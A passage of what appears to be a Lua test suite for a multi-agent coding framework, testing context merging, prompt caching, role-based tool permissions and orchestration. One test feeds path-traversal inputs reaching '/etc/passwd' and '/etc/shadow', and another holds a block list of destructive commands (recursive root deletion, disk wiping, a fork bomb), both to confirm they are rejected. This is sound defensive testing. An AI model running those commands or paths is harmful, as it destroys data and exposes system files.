  -- Now induce concurrent conflicting edits on decisions/ADR-1
  our_tree["decisions/ADR-1"] = { content = "Our ADR amendment", hash = WheelContext.compute_hash("Our ADR amendment") }
  their_tree["decisions/ADR-1"] = { content = "Their conflicting ADR amendment", hash = WheelContext.compute_hash("Their conflicting ADR amendment") }

  local conflict_merge = WheelContext.merge_3way(base_tree, our_tree, their_tree)
  assert(conflict_merge.conflict_count == 1, "expected 1 structured conflict")
  local c = conflict_merge.conflicts[1]
  assert(c.slot == "decisions/ADR-1")
  assert(c.base_content == "Shared Decision")
  assert(c.our_content == "Our ADR amendment")
  assert(c.their_content == "Their conflicting ADR amendment")
  assert(conflict_merge.merged["decisions/ADR-1"].conflict == true)
end)

run_test("WheelContext.ContextBus: in-memory pubsub event dispatch and agent notification", function()
  local bus = WheelContext.ContextBus.new()
  local received_events = {}

  bus:subscribe("agent-reviewer", function(event)
    table.insert(received_events, event)
  end)

  assert(bus:is_subscribed("agent-reviewer") == true)
  assert(bus:is_subscribed("unknown-agent") == false)

  -- Publish event
  local notified = bus:publish({ type = "slot_updated", name = "tasks/CTX-001/artifacts", hash = "abc123" })
  assert(notified == 1, "1 subscriber notified")
  assert(#received_events == 1)
  assert(received_events[1].type == "slot_updated")
  assert(received_events[1].name == "tasks/CTX-001/artifacts")
  assert(received_events[1].timestamp_ms ~= nil)

  -- Unsubscribe
  bus:unsubscribe("agent-reviewer")
  assert(bus:is_subscribed("agent-reviewer") == false)
  local notified2 = bus:publish({ type = "test_event" })
  assert(notified2 == 0, "0 subscribers notified after unsubscribe")
  assert(#received_events == 1)
end)

run_test("WheelContext: prefix-cache-friendly Three-Zone prompt compilation and key stability", function()
  local ctx = WheelContext.new()
  ctx:put_slot("workspace/overview", "Wheel Agent Framework")
  ctx:put_slot("decisions/ADR-001", "Pure Lua 5.1 compatibility")

  local prompt_opts = {
    system_instruction = "You are Bittie, an elite coding agent.",
    project_rules = { "Rule B: Zero unwrap", "Rule A: English only" },
    tool_schemas = { "run_command", "view_file", "write_file" },
    active_task = { id = "CTX-500", title = "Implement context cache", status = "running", priority = 1 },
    recent_actions = {
      { action_id = "act-1", tool = "run_command", exit_code = 0, duration_ms = 45, raw_stdout = "All tests passed" },
      { action_id = "act-2", tool = "write_file", exit_code = 0, duration_ms = 12, raw_stdout = "Created context.lua" },
    },
    turn_prompt = "Verify prompt cache stability across multiple invocations.",
  }

  local res1, err1 = ctx:compile_prompt(prompt_opts)
  assert(res1 ~= nil and res1.success == true, "compile_prompt should succeed")
  assert(res1.prefix_cache_key ~= nil and #res1.prefix_cache_key == 64)
  assert(res1.cache_share_ratio > 0.0)

  -- Verify Zone 1 canonical sorting: Rule A precedes Rule B regardless of input order
  local prompt_opts_shuffled = {
    system_instruction = "You are Bittie, an elite coding agent.",
    project_rules = { "Rule A: English only", "Rule B: Zero unwrap" }, -- different order
    tool_schemas = { "write_file", "run_command", "view_file" }, -- different order
    active_task = { id = "CTX-500", title = "Implement context cache", status = "running", priority = 1 },
    recent_actions = prompt_opts.recent_actions,
    turn_prompt = "Different turn prompt should not change Zone 1 prefix hash!",
  }

  local res2, err2 = ctx:compile_prompt(prompt_opts_shuffled)
  assert(res2 ~= nil and res2.success == true)
  -- The prefix_cache_key MUST be byte-identical, achieving 100% prefix cache reuse!
  assert(res2.prefix_cache_key == res1.prefix_cache_key, "Zone 1 prefix_cache_key must be byte-stable across orderings and turns")
  assert(res2.zone1_prefix == res1.zone1_prefix, "Zone 1 prefix string must match exactly")
end)

run_test("WheelContext: multi-tier budget reduction pipeline", function()
  -- Config with small budgets to trigger reduction tiers
  local ctx = WheelContext.new({
    max_budget_bytes = 1000,
    zone1_max_bytes = 400,
    zone2_max_bytes = 400,
    zone3_max_bytes = 300,
  })

  -- Zone 1 fail-closed on budget violation
  local huge_sys = string.rep("X", 500)
  local fail_res, fail_err = ctx:compile_prompt({ system_instruction = huge_sys })
  assert(fail_res == nil, "Zone 1 over budget must fail closed")
  assert(fail_err ~= nil and fail_err.error == "zone1_budget_exceeded")

  -- Populate slots with unpinned scratchpad
  ctx:put_slot("decisions/ADR-001", "Core Decision")
  ctx:put_slot("scratch/worker/temp_notes", string.rep("Scratchpad note ", 20)) -- candidate for Tier 1 pruning

  local prompt_opts = {
    system_instruction = "Concise instruction.",
    turn_prompt = "Step instruction.",
  }

  local compiled = ctx:compile_prompt(prompt_opts)
  assert(compiled ~= nil and compiled.success == true)
  -- If budget pressure triggered, scratchpad is pruned
  if compiled.tiers_applied.tier1_pruned_scratch then
    assert(string.find(compiled.prompt_string, "Scratchpad note") == nil, "Tier 1 must prune scratchpad")
  end
end)

run_test("WheelTeam & WheelAgent: shared context mounting, task claim, and handoff propagation", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  -- Spawn coding worker and reviewer
  local worker = team:spawn_agent({ name = "dev-1", role = WheelAgent.Role.CODING })
  local reviewer = team:spawn_agent({ name = "auditor-1", role = WheelAgent.Role.REVIEWER })

  assert(worker.context == team.context, "worker shares team context")
  assert(reviewer.context == team.context, "reviewer shares team context")

  -- Create and claim task
  kernel:create_task({ id = "CTX-777", title = "Multi-agent context sync" })
  local ok_claim = team:claim_task("dev-1", "CTX-777")
  assert(ok_claim == true)

  -- Verify active worker slot was written
  local worker_slot = team.context:get_slot("tasks/CTX-777/worker")
  assert(worker_slot.found == true)
  assert(worker_slot.content == "dev-1")

  -- Worker executes task and updates context slot
  worker:put_slot("tasks/CTX-777/artifacts", "commit-hash: abc999, diff: +120 -10")
  assert(team.context:get_slot("tasks/CTX-777/artifacts").found == true)

  -- Worker hands off to Reviewer
  local ok_handoff, handoff_rec = team:handoff("dev-1", "auditor-1", "CTX-777", {
    reason = "Ready for audit",
    rationale = "Implemented shared context and prefix cache; 100% tests pass.",
    checkpoint_hash = "cp-777",
  })
  assert(ok_handoff == true)

  -- Verify handoff slot recorded in shared context
  local handoff_slot = team.context:get_slot("tasks/CTX-777/handoff")
  assert(handoff_slot.found == true)
  assert(string.find(handoff_slot.content, "auditor-1", 1, true) ~= nil)
  assert(string.find(handoff_slot.content, "cp-777", 1, true) ~= nil)

  -- Reviewer immediately inspects artifacts without re-reading files
  local reviewer_view = reviewer:get_slot("tasks/CTX-777/artifacts")
  assert(reviewer_view.found == true)
  assert(string.find(reviewer_view.content, "abc999", 1, true) ~= nil)

  -- Team status reports context telemetry
  local st = team:status()
  assert(st.context ~= nil)
  assert(st.context.total_slots >= 2)
  assert(type(st.context.tree_hash) == "string")
end)

-- ===========================================================================
-- 11. WheelTool: Sandboxing, Path Traversal & Dangerous Command Guards
-- ===========================================================================

run_test("WheelTool: ActionIntent enum and schema validation", function()
  assert(WheelTool.ActionIntent.INSPECT == "inspect")
  assert(WheelTool.ActionIntent.MODIFY == "modify")
  assert(WheelTool.ActionIntent.EXECUTE == "execute")
  assert(WheelTool.ActionIntent.VERIFY == "verify")
  assert(WheelTool.ActionIntent.CUSTOM == "custom")

  local reg = WheelTool.get_default_registry()
  assert(reg ~= nil)
  local tools = reg:list_tools()
  assert(#tools >= 7, "at least 7 core tools registered")

  local tool_names = {}
  for _, t in ipairs(tools) do
    tool_names[t.name] = t.intent
  end
  assert(tool_names["read_file"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["write_file"] == WheelTool.ActionIntent.MODIFY)
  assert(tool_names["edit_file"] == WheelTool.ActionIntent.MODIFY)
  assert(tool_names["run_command"] == WheelTool.ActionIntent.EXECUTE)
  assert(tool_names["list_directory"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["search_code"] == WheelTool.ActionIntent.INSPECT)
  assert(tool_names["read_blob"] == WheelTool.ActionIntent.INSPECT)
end)

run_test("WheelTool: Path sandboxing and directory traversal rejection", function()
  local root = test_path("test_tool_sandbox")

  -- Safe relative paths resolve within root
  local p1, err1 = WheelTool.sanitize_path("foo/bar.txt", root)
  assert(p1 == root .. "/foo/bar.txt", "relative path inside root: " .. tostring(err1))

  -- Inner . and .. that stay inside root resolve cleanly
  local p2, err2 = WheelTool.sanitize_path("foo/./baz/../bar.txt", root)
  assert(p2 == root .. "/foo/bar.txt", "inner .. inside root: " .. tostring(err2))

  -- Path traversal attempts escaping root fail closed
  local p3, err3 = WheelTool.sanitize_path("../../etc/passwd", root)
  assert(p3 == nil, "path traversal must return nil")
  assert(string.find(err3, "path_traversal_denied", 1, true) ~= nil, "error message specifies path_traversal_denied")

  local p4, err4 = WheelTool.sanitize_path("foo/../../../etc/shadow", root)
  assert(p4 == nil, "excessive .. traversal must fail closed")
  assert(string.find(err4, "path_traversal_denied", 1, true) ~= nil)

  -- Absolute path not starting with root fails closed
  local p5, err5 = WheelTool.sanitize_path("/etc/passwd", root)
  assert(p5 == nil, "external absolute path must fail closed")
  assert(string.find(err5, "path_traversal_denied", 1, true) ~= nil)
end)

run_test("WheelTool: Catastrophic dangerous command detection", function()
  -- Dangerous commands must be blocked
  local bad_commands = {
    "rm -rf /",
    "rm -rf /*",
    "rm -rf /etc",
    "rm -rf ~",
    "rm -rf ../",
    "mkfs.ext4 /dev/nvme0n1",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    ":(){ :|:& };:",
    "chmod -R 777 /",
    "shutdown -h now",
    "reboot",
  }

  for _, cmd in ipairs(bad_commands) do
    local is_bad, reason = WheelTool.check_dangerous_command(cmd)
    assert(is_bad == true, "command must be blocked: " .. cmd)
    assert(string.find(reason, "dangerous_command_blocked", 1, true) ~= nil)
  end

  -- Safe commands must be allowed
  local safe_commands = {
    "cargo test --workspace",
    "git status",
    "ls -la src/",
    "echo 'hello world'",
    "bun run prettier --check .",
  }

  for _, cmd in ipairs(safe_commands) do
    local is_bad, _ = WheelTool.check_dangerous_command(cmd)
    assert(is_bad == false, "safe command should not be blocked: " .. cmd)
  end
end)

-- ===========================================================================
-- 12. WheelTool: Core Engineering Tools Execution
-- ===========================================================================

run_test("WheelTool: Core file tools (read_file, write_file, edit_file)", function()
  local root = test_path("test_tool_sandbox")
  os.execute("mkdir -p " .. root)
  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }

  -- 1. write_file: create a sample text file
  local sample_text = "Line 1: Alpha\nLine 2: Beta\nLine 3: Gamma\nLine 4: Delta\nLine 5: Epsilon\n"
  local w_res = reg:dispatch("write_file", { path = "nested/sample.txt", content = sample_text, overwrite = true }, env)
  assert(w_res.success == true, "write_file should succeed: " .. tostring(w_res.stderr))
  assert(w_res.exit_code == 0)

  -- 2. write_file without overwrite fails if file exists
  local w_no_ov = reg:dispatch("write_file", { path = "nested/sample.txt", content = "new text", overwrite = false }, env)
  assert(w_no_ov.success == false, "write_file without overwrite must fail")
  assert(string.find(w_no_ov.stderr, "already exists", 1, true) ~= nil)

  -- 3. read_file: full read
  local r_full = reg:dispatch("read_file", { path = "nested/sample.txt" }, env)
  assert(r_full.success == true)
  assert(string.find(r_full.stdout, "Line 1: Alpha", 1, true) ~= nil)
  assert(string.find(r_full.stdout, "Line 5: Epsilon", 1, true) ~= nil)

  -- 4. read_file: bounded line slicing (lines 2 to 4)
  local r_slice = reg:dispatch("read_file", { path = "nested/sample.txt", start_line = 2, end_line = 4 }, env)
  assert(r_slice.success == true)
  assert(string.find(r_slice.stdout, "Line 1: Alpha", 1, true) == nil)
  assert(string.find(r_slice.stdout, "Line 2: Beta", 1, true) ~= nil)
  assert(string.find(r_slice.stdout, "Line 4: Delta", 1, true) ~= nil)
  assert(string.find(r_slice.stdout, "Line 5: Epsilon", 1, true) == nil)

  -- 5. edit_file: exact target replacement
  local e_res = reg:dispatch("edit_file", {
    path = "nested/sample.txt",
    target = "Line 3: Gamma",
    replacement = "Line 3: Gamma (MODIFIED)",
  }, env)
  assert(e_res.success == true, "edit_file should succeed: " .. tostring(e_res.stderr))

  -- Verify replacement persisted
  local r_check = reg:dispatch("read_file", { path = "nested/sample.txt" }, env)
  assert(string.find(r_check.stdout, "Line 3: Gamma (MODIFIED)", 1, true) ~= nil)

  -- 6. edit_file: non-existent target fails cleanly
  local e_fail = reg:dispatch("edit_file", {
    path = "nested/sample.txt",
    target = "Non-existent string 12345",
    replacement = "Replacement",
  }, env)
  assert(e_fail.success == false)
  assert(string.find(e_fail.stderr, "not found", 1, true) ~= nil)

  -- Cleanup
  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: read_file total_lines reports only emitted lines", function()
  local root = test_path("test_tool_read_bounds")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/lines.txt", "w"))
  for index = 1, 10 do
    fh:write("line-" .. index .. "\n")
  end
  fh:close()

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("read_file")

  local full = tool.execute({ path = "lines.txt" }, env)
  assert(full.success == true)
  assert(full.lines_read == 10, "full read must emit all 10 lines")
  assert(full.total_lines == 10, "full read total_lines must match the emitted lines")

  local ranged = tool.execute({ path = "lines.txt", start_line = 2, end_line = 4 }, env)
  assert(ranged.success == true)
  assert(ranged.lines_read == 3, "ranged read must emit three lines")
  assert(ranged.total_lines == 3,
    "total_lines must count emitted lines, not the whole file or the end_line offset")
  assert(ranged.stdout == "line-2\nline-3\nline-4", "ranged output must stay exact")

  local end_bounded = tool.execute({ path = "lines.txt", end_line = 3 }, env)
  assert(end_bounded.lines_read == 3 and end_bounded.total_lines == 3,
    "end_line must bound total_lines as well as the output")

  local byte_bounded = tool.execute({ path = "lines.txt", max_bytes = 20 }, env)
  assert(byte_bounded.success == true)
  assert(byte_bounded.total_lines == byte_bounded.lines_read,
    "max_bytes truncation must report only emitted lines")
  assert(byte_bounded.total_lines < 10, "max_bytes must stop before the whole file")
  assert(byte_bounded.truncated == true, "a bounded read must report truncation")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: search_code bounds output and keeps the trailing newline", function()
  local root = test_path("test_tool_search_bounds")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/matches.txt", "w"))
  for index = 1, 150 do
    fh:write("needle " .. index .. "\n")
  end
  fh:close()

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("search_code")

  local found = tool.execute({ query = "needle" }, env)
  assert(found.success == true)
  assert(found.stdout:sub(-1) == "\n",
    "search_code must keep the previous head pipeline's trailing newline")
  local line_count = 0
  for _ in found.stdout:gmatch("\n") do
    line_count = line_count + 1
  end
  assert(line_count == 100, "search_code must keep at most 100 lines, got " .. line_count)
  assert(found.truncated == true,
    "search_code must report that the bounded observation dropped lines")

  local missing = tool.execute({ query = "needle-not-present" }, env)
  assert(missing.success == true)
  assert(missing.stdout == "", "an empty result must not add a newline")

  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 13. WheelTool: Role Authority Gating & Intent Enforcement
-- ===========================================================================

run_test("WheelTool: Role authority gating and intent enforcement", function()
  local reg = WheelTool.get_default_registry()
  local root = test_path("test_tool_sandbox")
  os.execute("mkdir -p " .. root)

  -- Research role: strictly read-only (Inspect & Verify allowed; Modify & Execute denied)
  local env_research = { workspace_root = root, role = WheelAgent.Role.RESEARCH }

  -- Research attempts write_file -> MUST BE DENIED
  local res_write = reg:dispatch("write_file", { path = "test.txt", content = "data" }, env_research)
  assert(res_write.success == false)
  assert(res_write.status == WheelTool.OutcomeStatus.DENIED)
  assert(res_write.exit_code == 126)
  assert(string.find(res_write.stderr, "role_authority_violation", 1, true) ~= nil)
  assert(string.find(res_write.stderr, "read-only authority", 1, true) ~= nil)

  -- Research attempts run_command -> MUST BE DENIED
  local res_cmd = reg:dispatch("run_command", { command = "ls" }, env_research)
  assert(res_cmd.success == false)
  assert(res_cmd.status == WheelTool.OutcomeStatus.DENIED)
  assert(string.find(res_cmd.stderr, "role_authority_violation", 1, true) ~= nil)

  -- Research calls read_file (inspect) -> ALLOWED (fails on missing file, not authority)
  local res_read = reg:dispatch("read_file", { path = "nonexistent.txt" }, env_research)
  assert(res_read.status ~= WheelTool.OutcomeStatus.DENIED, "inspect intent allowed for Research")
  assert(string.find(res_read.stderr, "File not found", 1, true) ~= nil)

  -- Reviewer role: strictly read-only
  local env_reviewer = { workspace_root = root, role = WheelAgent.Role.REVIEWER }
  local rev_edit = reg:dispatch("edit_file", { path = "test.txt", target = "a", replacement = "b" }, env_reviewer)
  assert(rev_edit.success == false)
  assert(rev_edit.status == WheelTool.OutcomeStatus.DENIED)

  -- Commander role: plans and inspects; direct code modification denied
  local env_commander = { workspace_root = root, role = WheelAgent.Role.COMMANDER }
  local cmd_write = reg:dispatch("write_file", { path = "test.txt", content = "data" }, env_commander)
  assert(cmd_write.success == false)
  assert(cmd_write.status == WheelTool.OutcomeStatus.DENIED)
  assert(string.find(cmd_write.stderr, "role 'Commander' plans and orchestrates", 1, true) ~= nil)

  -- Coding Worker role: full access
  local env_coding = { workspace_root = root, role = WheelAgent.Role.CODING }
  local code_write = reg:dispatch("write_file", { path = "allowed.txt", content = "ok", overwrite = true }, env_coding)
  assert(code_write.success == true, "Coding role has modify authority")

  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 14. WheelTool: Auto-Spillover Pipeline & Content-Addressed Blob Recovery
-- ===========================================================================

run_test("WheelTool: Auto-spillover pipeline and content-addressed blob recovery", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local context = WheelContext.new({ kernel = kernel })

  -- Generate 6 KiB payload (150 lines > 4096 threshold)
  local line_pattern = "Record #%04d: Event telemetry outcome payload for pipeline\n"
  local lines = {}
  for i = 1, 150 do
    table.insert(lines, string.format(line_pattern, i))
  end
  local big_output = table.concat(lines)
  assert(#big_output > 4096, "output is over 4 KiB spillover threshold")

  -- Process outcome through spillover pipeline
  local outcome = WheelTool.process_spillover({
    tool = "run_command",
    intent = WheelTool.ActionIntent.EXECUTE,
    success = true,
    exit_code = 0,
    stdout = big_output,
    stderr = "",
    duration_ms = 45,
  }, {
    threshold_bytes = 4096,
    context = context,
    kernel = kernel,
  })

  assert(outcome.spilled == true, "outcome must be marked spilled")
  assert(outcome.spillover_bytes == #big_output)
  assert(type(outcome.spillover_hash) == "string")
  assert(#outcome.spillover_hash == 64, "spillover hash is 64 hex characters")

  -- Preview contains first 10 lines, notice, and last 5 lines
  assert(string.find(outcome.preview, "Record #0001:", 1, true) ~= nil, "preview contains head")
  assert(string.find(outcome.preview, "Record #0010:", 1, true) ~= nil)
  assert(string.find(outcome.preview, "spilled to blob: " .. outcome.spillover_hash, 1, true) ~= nil, "preview contains notice")
  assert(string.find(outcome.preview, "Record #0150:", 1, true) ~= nil, "preview contains tail")
  assert(string.find(outcome.preview, "Record #0050:", 1, true) == nil, "preview omits middle lines")

  -- Formatted observation contains tool header and preview
  local obs = outcome:format_observation()
  assert(string.find(obs, "[Tool: run_command (exit=0, 45ms, spilled=", 1, true) ~= nil)
  local flagged = WheelTool.process_spillover({
    tool = "run_command",
    success = false,
    exit_code = 124,
    timed_out = true,
    truncated = true,
    stdout = "",
    stderr = "timed out",
  })
  local flagged_obs = flagged:format_observation()
  assert(flagged_obs:find("timed_out", 1, true) ~= nil,
    "formatted observations must surface the timeout flag")
  assert(flagged_obs:find("truncated", 1, true) ~= nil,
    "formatted observations must surface the truncation flag")

  -- Content-addressed blob was written to context
  local slot = context:get_slot("blobs/" .. outcome.spillover_hash)
  assert(slot.found == true, "blob must be stored in context")
  assert(#slot.content == #big_output)

  -- read_blob tool recovers full content and slices
  local reg = WheelTool.get_default_registry()
  local blob_res = reg:dispatch("read_blob", {
    hash = outcome.spillover_hash,
    offset = 0,
    length = 50,
  }, { context = context })
  assert(blob_res.success == true)
  assert(#blob_res.stdout == 50)
  assert(string.find(blob_res.stdout, "Record #0001:", 1, true) ~= nil)
end)

-- ===========================================================================
-- 15. WheelAgent: execute_tool, call_tools, and Action Recording
-- ===========================================================================

run_test("WheelAgent: execute_tool, call_tools, and Action Recording", function()
  local root = test_path("test_agent_tools")
  os.execute("mkdir -p " .. root)
  local kernel = WheelKernel.new({ in_memory = true })
  local context = WheelContext.new({ kernel = kernel })

  local agent = WheelAgent.new({
    name = "dev-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    context = context,
    workspace = { root = root },
    tools = { "read_file", "write_file", "search_code", "run_command" },
  })

  assert(agent.tool_registry ~= nil, "agent has bound tool_registry")
  local st = agent:status()
  assert(st.tool_count >= 7)

  -- 1. agent:execute_tool writes a file
  local w_out = agent:execute_tool("write_file", {
    path = "workspace_note.md",
    content = "# Architecture Note\nDesign approved.",
    overwrite = true,
  })
  assert(w_out.success == true)
  assert(w_out.exit_code == 0)

  -- 2. agent:execute_tool reads file back
  local r_out = agent:execute_tool("read_file", { path = "workspace_note.md" })
  assert(r_out.success == true)
  assert(string.find(r_out.stdout, "# Architecture Note", 1, true) ~= nil)

  -- 3. agent:call_tools handles batch requests
  local batch_outcomes = agent:call_tools({
    { id = "call-1", name = "read_file", arguments = { path = "workspace_note.md" } },
    { id = "call-2", name = "search_code", arguments = { query = "Architecture", path = "." } },
  })
  assert(#batch_outcomes == 2)
  assert(batch_outcomes[1].call_id == "call-1")
  assert(batch_outcomes[1].success == true)
  assert(batch_outcomes[2].call_id == "call-2")
  assert(batch_outcomes[2].success == true)

  -- 4. Kernel recorded the executed actions
  local rec_actions = kernel:recent_actions() or {}
  assert(#rec_actions >= 3, "actions recorded in kernel")

  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 16. Multi-Agent Wave Orchestration Loop & Task Execution Pipeline
-- ===========================================================================

run_test("WheelTeam: run_orchestration_loop full diamond DAG wave orchestration", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  -- Setup team of peer colleagues
  local cmd = team:spawn_agent({ name = "commander-01", role = WheelAgent.Role.COMMANDER })
  local coder1 = team:spawn_agent({ name = "worker-01", role = WheelAgent.Role.CODING })
  local coder2 = team:spawn_agent({ name = "worker-02", role = WheelAgent.Role.CODING })
  local reviewer = team:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  -- Commander decomposes 4-task Diamond DAG
  -- T1 -> T2, T3 -> T4
  cmd:decompose_plan({
    { id = "T-SETUP", title = "Setup architecture and types", priority = 10 },
    { id = "T-MOD-A", title = "Implement subsystem Alpha", priority = 8, dependencies = { "T-SETUP" } },
    { id = "T-MOD-B", title = "Implement subsystem Beta", priority = 8, dependencies = { "T-SETUP" } },
    { id = "T-INTEG", title = "Integration and release", priority = 5, dependencies = { "T-MOD-A", "T-MOD-B" } },
  })

  local waves_started = {}
  local completed_events = {}

  local report = team:run_orchestration_loop({
    max_waves = 10,
    auto_reviewer = true,
    on_wave_start = function(wave_num, ready_count)
      table.insert(waves_started, { wave = wave_num, ready = ready_count })
    end,
    on_task_complete = function(task_id, outcome)
      table.insert(completed_events, task_id)
    end,
  })

  -- Verify orchestration report
  assert(report.success == true, "orchestration loop must succeed: " .. tostring(report.blocked_reason))
  assert(#report.completed_tasks == 4, "all 4 tasks completed")
  assert(#report.failed_tasks == 0, "zero failed tasks")
  assert(report.waves_executed >= 3, "must execute at least 3 topological waves (depth of diamond DAG)")
  assert(report.waves_calculated == 3, "calculated wave depth of diamond DAG must be 3")
  assert(report.total_handoffs == 4, "4 worker-to-reviewer verification handoffs must occur")
  assert(report.total_checkpoints >= 4, "checkpoints committed during worker completion and reviewer acceptance")
  assert(report.duration_ms >= 0, "duration reported")

  -- Verify all task statuses in kernel are succeeded
  local all_tasks = kernel:list_tasks()
  for _, t in ipairs(all_tasks) do
    local st = string.lower(t.status or "")
    assert(st == "succeeded", "task " .. t.id .. " must have succeeded status in kernel")
  end

  -- Verify context slots
  assert(team.context ~= nil)
  for _, tid in ipairs({ "T-SETUP", "T-MOD-A", "T-MOD-B", "T-INTEG" }) do
    local art_slot = team.context:get_slot("tasks/" .. tid .. "/artifacts")
    assert(art_slot.found == true, "artifacts slot for " .. tid .. " must exist")
    assert(#art_slot.content > 0, "artifacts slot for " .. tid .. " must not be empty")

    local ho_slot = team.context:get_slot("tasks/" .. tid .. "/handoff")
    assert(ho_slot.found == true, "handoff slot for " .. tid .. " must exist")
    assert(string.find(ho_slot.content, "to: reviewer-01", 1, true) ~= nil)

    local rev_slot = team.context:get_slot("tasks/" .. tid .. "/review")
    assert(rev_slot.found == true, "review slot for " .. tid .. " must exist")
    assert(string.find(rev_slot.content, "approved: true", 1, true) ~= nil)
  end

  local last_run_slot = team.context:get_slot("workspace/orchestration/last_run")
  assert(last_run_slot.found == true, "workspace last_run summary recorded")
  assert(string.find(last_run_slot.content, "success: true", 1, true) ~= nil)

  -- Verify all colleagues returned to idle state
  for _, a in ipairs(team:list_agents()) do
    assert(a.state == "idle", "agent " .. a.name .. " must return to idle state after loop")
    assert(a.active_task_id == nil)
  end
end)

run_test("WheelTeam: run_orchestration_loop failure blocking and deadlock handling", function()
  -- 1. Worker failure blocks downstream tasks
  local kernel1 = WheelKernel.new({ in_memory = true })
  local team1 = WheelTeam.new({ kernel = kernel1 })
  team1:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })
  team1:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  kernel1:create_task({ id = "T-FAIL", title = "Failing task", priority = 10 })
  kernel1:create_task({ id = "T-DEP", title = "Dependent on failure", dependencies = { "T-FAIL" } })

  local report_fail = team1:run_orchestration_loop({
    step_fn = function(agent, ctx, iter)
      return {
        error = "compiler syntax error on line 42",
        done = false,
      }
    end,
  })

  assert(report_fail.success == false, "loop must fail when task fails")
  assert(#report_fail.completed_tasks == 0)
  assert(#report_fail.failed_tasks >= 1)
  assert(report_fail.failed_tasks[1] == "T-FAIL")
  assert(report_fail.blocked_reason ~= nil)
  assert(string.find(report_fail.blocked_reason, "blocking downstream", 1, true) ~= nil)

  -- Verify downstream task was cascaded to blocked
  local dep_task = kernel1:get_task("T-DEP")
  assert(string.lower(dep_task.status) == "blocked", "downstream task must be blocked by prerequisite failure")

  -- 2. Reviewer rejection fails task and blocks downstream
  local kernel2 = WheelKernel.new({ in_memory = true })
  local team2 = WheelTeam.new({ kernel = kernel2 })
  team2:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })
  team2:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  kernel2:create_task({ id = "T-AUDIT", title = "Audit task" })
  kernel2:create_task({ id = "T-NEXT", title = "Next task", dependencies = { "T-AUDIT" } })

  local report_reject = team2:run_orchestration_loop({
    review_fn = function(agent, task, history)
      return false, "Security audit rejected: hardcoded credentials detected"
    end,
  })

  assert(report_reject.success == false, "loop must report failure when reviewer rejects")
  assert(#report_reject.failed_tasks >= 1)
  assert(report_reject.failed_tasks[1] == "T-AUDIT")

  -- 3. Empty DAG returns success immediately
  local kernel3 = WheelKernel.new({ in_memory = true })
  local team3 = WheelTeam.new({ kernel = kernel3 })
  team3:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })

  local report_empty = team3:run_orchestration_loop()
  assert(report_empty.success == true)
  assert(report_empty.waves_executed == 0)
  assert(#report_empty.completed_tasks == 0)

  -- 4. Fail closed when auto_reviewer is true but no reviewer colleague exists
  local kernel4 = WheelKernel.new({ in_memory = true })
  local team4 = WheelTeam.new({ kernel = kernel4 })
  team4:spawn_agent({ name = "solo-coder", role = WheelAgent.Role.CODING })
  kernel4:create_task({ id = "T-SOLO", title = "Solo task" })

  local report_no_rev = team4:run_orchestration_loop({ auto_reviewer = true })
  assert(report_no_rev.success == false)
  assert(#report_no_rev.failed_tasks == 1)
  assert(report_no_rev.failed_tasks[1] == "T-SOLO")

  -- 5. auto_reviewer = false releases task directly as succeeded without reviewer
  local kernel5 = WheelKernel.new({ in_memory = true })
  local team5 = WheelTeam.new({ kernel = kernel5 })
  team5:spawn_agent({ name = "solo-coder-2", role = WheelAgent.Role.CODING })
  kernel5:create_task({ id = "T-DIRECT", title = "Direct release task" })

  local report_direct = team5:run_orchestration_loop({ auto_reviewer = false })
  assert(report_direct.success == true)
  assert(#report_direct.completed_tasks == 1)
  assert(report_direct.completed_tasks[1] == "T-DIRECT")
end)

run_test("Wheel: Plugin command orchestrate registration and execution", function()
  -- Reset package cache to re-trigger command registration with mock bitty
  package.loaded["wheel.init"] = nil
  package.loaded["lua.wheel.init"] = nil

  local notifications = {}
  local registered_commands = {}

  _G.bitty = {
    commands = {
      register = function(def)
        registered_commands[def.id] = def
        return 1
      end,
    },
    notify = {
      show = function(payload)
        table.insert(notifications, payload)
        return true
      end,
    },
  }

  local wheel = require("wheel.init")
  assert(registered_commands["orchestrate"] ~= nil, "orchestrate command must be registered")
  assert(registered_commands["orchestrate"].title == "Wheel: orchestrate")

  -- Initialize a plan
  registered_commands["plan"].run()
  assert(#wheel.kernel:list_tasks() == 3)

  -- Run orchestrate command
  registered_commands["orchestrate"].run()
  local last_notif = notifications[#notifications]
  assert(last_notif ~= nil)
  assert(last_notif.title == "Wheel Orchestration")
  assert(string.find(last_notif.body, "completed successfully", 1, true) ~= nil)

  -- Clean up global
  _G.bitty = nil
end)

-- ---------------------------------------------------------------------------
-- Section 17: Provider Adapters, SSE Streaming Parser & ReAct Autonomous Runner
-- ---------------------------------------------------------------------------

local WheelProvider = require("wheel.provider")
local WheelRunner = require("wheel.runner")

run_test("WheelProvider.SSEParser: line buffering, fragmented chunks, and [DONE]", function()
  local parser = WheelProvider.SSEParser.new()
  local events = {}

  -- 1. Standard single event
  parser:feed("event: message\ndata: {\"msg\":\"hello\"}\n\n", function(evt)
    table.insert(events, evt)
  end)
  assert(#events == 1, "must parse single event")
